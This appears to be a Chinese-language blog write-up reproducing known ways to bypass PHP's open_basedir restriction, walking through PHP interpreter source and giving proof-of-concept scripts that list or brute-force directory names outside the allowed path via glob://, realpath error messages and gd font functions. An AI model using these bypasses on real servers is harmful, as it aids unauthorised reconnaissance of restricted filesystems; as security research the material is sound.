Open_basedir  指令用来限制php只能访问哪些目录,所有php中相关文件读写的函数都会经过  `open_bsaedir` 的检查

设置open_basedir 的方法，在linux下，不同的目录由`:` 分割

    ini_set('open_basedir','/var/www/a/:/tmp');

在window下不同目录由`;`分割


先来纠正一个《代码审计》一书中的小错误（可能是已修复）, 书中说指定的限制实际上是前缀，而不是目录名，例如，如果配置open_basedir=/www/a , 那么目录`/www/a` 和 `/www/ab` 都是可以访问的。 所以如果要将访问权限限制在指定的目录内， 请用斜线结束路径名。 

自己试了下发现无论是否已斜线结尾都表示目录名

```php
<?php 
ini_set('open_basedir','/var/www/a');

var_dump(scandir('/var/www/a')); //执行正确
var_dump(scandir('/var/www/ab')); //报错
```


### 一个失效的直接列举目录的方法

在p牛的博客中介绍的一种利用DirectoryIterator + Glob 直接列举目录的方法，glob 数据流包装器从php5.3.0 起开始有效的， 用来查找匹配的文件路径。   此方法在linux列举目录无视open_basedir.

```php
<?php
printf('<b>open_basedir : %s </b><br />', ini_get('open_basedir'));
$file_list = array();
// normal files
$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {
    $file_list[] = $f->__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator("glob:///.*");
foreach($it as $f) {
    $file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
        echo "{$f}<br/>";
}
?>
```


现已就被修复了...


### 利用返回信息爆破目录

1. realpath 列举目录

Realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。

在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。


我们来看一下源码: `ext/standard/file.c`

```c
PHP_FUNCTION(realpath)
{
	char *filename;
	size_t filename_len;
	char resolved_path_buff[MAXPATHLEN];

	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_PATH(filename, filename_len)
	ZEND_PARSE_PARAMETERS_END();

	if (VCWD_REALPATH(filename, resolved_path_buff)) {
		if (php_check_open_basedir(resolved_path_buff)) {
			RETURN_FALSE;
		}

#ifdef ZTS
		if (VCWD_ACCESS(resolved_path_buff, F_OK)) {
			RETURN_FALSE;
		}
#endif
		RETURN_STRING(resolved_path_buff);
	} else {
		RETURN_FALSE;
	}
}
```
open_basedir的验证函数是php_check_open_basedir,我们查看以下这个函数： `main/fopen_wrappers.c`

```c
PHPAPI int php_check_open_basedir_ex(const char *path, int warn)
{
	/* Only check when open_basedir is available */
	if (PG(open_basedir) && *PG(open_basedir)) {
		char *pathbuf;
		char *ptr;
		char *end;

		/* Check if the path is too long so we can give a more useful error
		* message. */
		if (strlen(path) > (MAXPATHLEN - 1)) {
			php_error_docref(NULL, E_WARNING, "File name is longer than the maximum allowed path length on this platform (%d): %s", MAXPATHLEN, path);
			errno = EINVAL;
			return -1;
		}

		pathbuf = estrdup(PG(open_basedir));

		ptr = pathbuf;

		while (ptr && *ptr) {
			end = strchr(ptr, DEFAULT_DIR_SEPARATOR);
			if (end != NULL) {
				*end = '\0';
				end++;
			}

			if (php_check_specific_open_basedir(ptr, path) == 0) {
				efree(pathbuf);
				return 0;
			}

			ptr = end;
		}
		if (warn) {
			php_error_docref(NULL, E_WARNING, "open_basedir restriction in effect. File(%s) is not within the allowed path(s): (%s)", path, PG(open_basedir));
		}
		efree(pathbuf);
		errno = EPERM; /* we deny permission to open it */
		return -1;
	}

	/* Nothing to check... */
	return 0;
}
```


可以看到realpath函数的错误处理，第一个if调用了VCWD_REALPATH 函数， 大概是判断路径是否正确，如果错误不执行php_check_open_basedir， 直接返回false, 如果是正确的文件路径才去验证是否在open_basedir目录下

可以看到这个逻辑是存在漏洞的，举个例子， 我们需要猜解根目录（不再open_basedir中)下的所有文件， 只用写一个捕捉err_handle().  当猜解某个存在的文件时， 会因不满足php_check_open_basedir函数抛出错误而进入err_handle().  当猜解某个不存在的文件时， 程序会直接返回false. 


在linux 下猜解目录的效率很低，  window 下可以借助通配符`< >`

借用p牛的poc:

```c
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    realpath($file);
}
function isexists($errno, $errstr)
{
    $regexp = '/File\((.*)\) is not within/';
    preg_match($regexp, $errstr, $matches);
    if (isset($matches[1])) {
        printf("%s <br/>", $matches[1]);
    }
}
?>
```



2. SplFileInfo::getRealPath 列举目录

我们来看一下该函数的源码: `ext/spl/spl_directory.c`

```c
SPL_METHOD(SplFileInfo, getRealPath)
{
	spl_filesystem_object *intern = Z_SPLFILESYSTEM_P(getThis());
	char buff[MAXPATHLEN];
	char *filename;
	zend_error_handling error_handling;

	if (zend_parse_parameters_none() == FAILURE) {
		return;
	}

	zend_replace_error_handling(EH_THROW, spl_ce_RuntimeException, &error_handling);

	if (intern->type == SPL_FS_DIR && !intern->file_name && intern->u.dir.entry.d_name[0]) {
		spl_filesystem_object_get_file_name(intern);
	}

	if (intern->orig_path) {
		filename = intern->orig_path;
	} else {
		filename = intern->file_name;
	}


	if (filename && VCWD_REALPATH(filename, buff)) {
#ifdef ZTS
		if (VCWD_ACCESS(buff, F_OK)) {
			RETVAL_FALSE;
		} else
#endif
		RETVAL_STRING(buff);
	} else {
		RETVAL_FALSE;
	}

	zend_restore_error_handling(&error_handling);
}
```

通过看源码我们发现该方法也是调用了VCWD_REALPATH函数来验证路径是否正确， 但完全没考虑open_basedir. 

我们来直接搜一下:  VCWD_REALPATH 函数

```
/home/lj/code/c/php-src/ext/gd/gd.c:
 4048  		char tmp_font_path[MAXPATHLEN];
 4049  
 4050: 		if (!VCWD_REALPATH(fontname, tmp_font_path)) {
 4051  			fontname = NULL;
 4052  		}

/home/lj/code/c/php-src/ext/gettext/gettext.c:
  262  
  263  	if (dir[0] != '\0' && strcmp(dir, "0")) {
  264: 		if (!VCWD_REALPATH(dir, dir_name)) {
  265  			RETURN_FALSE;
  266  		}

/home/lj/code/c/php-src/ext/opcache/zend_accelerator_blacklist.c:
  244  	zend_accel_error(ACCEL_LOG_DEBUG,"Loading blacklist file:  '%s'", filename);
  245  
  246: 	if (VCWD_REALPATH(filename, buf)) {
  247  		blacklist_path_length = zend_dirname(buf, strlen(buf));
  248  		blacklist_path = zend_strndup(buf, blacklist_path_length);
  
...
...

```



3. gd.c  里面部分源码:

```c
static void php_imagettftext_common(INTERNAL_FUNCTION_PARAMETERS, int mode, int extended)
{

...

#ifdef VIRTUAL_DIR
	{
		char tmp_font_path[MAXPATHLEN];

		if (!VCWD_REALPATH(fontname, tmp_font_path)) {
			fontname = NULL;
		}
	}
#endif /* VIRTUAL_DIR */

	PHP_GD_CHECK_OPEN_BASEDIR(fontname, "Invalid font filename");

#ifdef HAVE_GD_FREETYPE
	if (extended) {
		error = gdImageStringFTEx(im, brect, col, fontname, ptsize, angle, x, y, str, &strex);
	}
	else
		error = gdImageStringFT(im, brect, col, fontname, ptsize, angle, x, y, str);

#endif /* HAVE_GD_FREETYPE */
```

这里也和realpath 函数一样， PHP_GD_CHECK_OPEN_BASEDIR 函数是验证open_basedir，

gd.c 里面很多函数都调用了该函数:

```c
PHP_FUNCTION(imageftbbox)
{
	php_imagettftext_common(INTERNAL_FUNCTION_PARAM_PASSTHRU, TTFTEXT_BBOX, 1);
}
/* }}} */

/* {{{ proto array imagefttext(resource im, float size, float angle, int x, int y, int col, string font_file, string text [, array extrainfo])
   Write text to the image using fonts via freetype2 */
PHP_FUNCTION(imagefttext)
{
	php_imagettftext_common(INTERNAL_FUNCTION_PARAM_PASSTHRU, TTFTEXT_DRAW, 1);
}
/* }}} */
#endif /* HAVE_GD_FREETYPE && HAVE_LIBFREETYPE */

/* {{{ proto array imagettfbbox(float size, float angle, string font_file, string text)
   Give the bounding box of a text using TrueType fonts */
PHP_FUNCTION(imagettfbbox)
{
	php_imagettftext_common(INTERNAL_FUNCTION_PARAM_PASSTHRU, TTFTEXT_BBOX, 0);
}
/* }}} */

/* {{{ proto array imagettftext(resource im, float size, float angle, int x, int y, int col, string font_file, string text)
   Write text to the image using a TrueType font */
PHP_FUNCTION(imagettftext)
{
	php_imagettftext_common(INTERNAL_FUNCTION_PARAM_PASSTHRU, TTFTEXT_DRAW, 0);
}
```


都可以用来爆破目录来绕过open_basedir

还有bindtextdomain 函数，等等都存在绕过open_basedir的方法。



当然这些方法p牛14年就发出来了， 现在这只是复现一下大佬的挖掘过程， 再膜一哈。

